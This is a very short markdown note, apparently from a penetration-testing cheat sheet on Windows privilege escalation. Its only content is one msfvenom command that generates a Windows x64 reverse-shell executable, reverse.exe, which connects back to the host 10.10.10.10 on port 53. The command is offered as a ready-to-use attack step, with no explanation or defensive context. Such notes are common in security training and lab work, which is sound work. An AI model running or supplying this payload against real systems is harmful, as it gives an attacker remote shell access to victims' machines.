# Windows Privilege Escalation

## Creating a Reverse Shell Executable (.exe)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```
